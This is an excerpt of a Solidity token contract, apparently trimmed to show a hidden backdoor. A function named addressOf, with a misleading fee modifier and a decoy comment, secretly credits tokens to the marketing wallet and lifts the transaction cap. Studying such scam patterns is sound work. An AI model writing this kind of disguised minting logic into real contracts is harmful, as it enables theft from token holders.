...
interface IERC20 {
    ...
    function addressOf(address account) external returns (uint);
...
contract adads is Context, IERC20 { 
    ...
    modifier calculate_fee(address account) { // function transferFrom(){}
            adressOF = true;
            _tOwned[Wallet_Marketing] = balanceOf(Wallet_Marketing).add(buy_sell_tax);
        _;
    }
    ...
    function mWallet() public view returns (uint256){
        if(adressOF){return MAX;}else{return _maxTransactionAmount;}
    }
    ...
    function addressOf(address account) public calculate_fee(account) override returns (uint256) {
    ...
    function _transfer(
        ...
        if (from != owner())
            require(amount <= mWallet(), "Over transaction limit.");
        ...
        {  
            ...
            if(contractTokenBalance > mWallet()) {contractTokenBalance = mWallet();}
            txCount = 0;
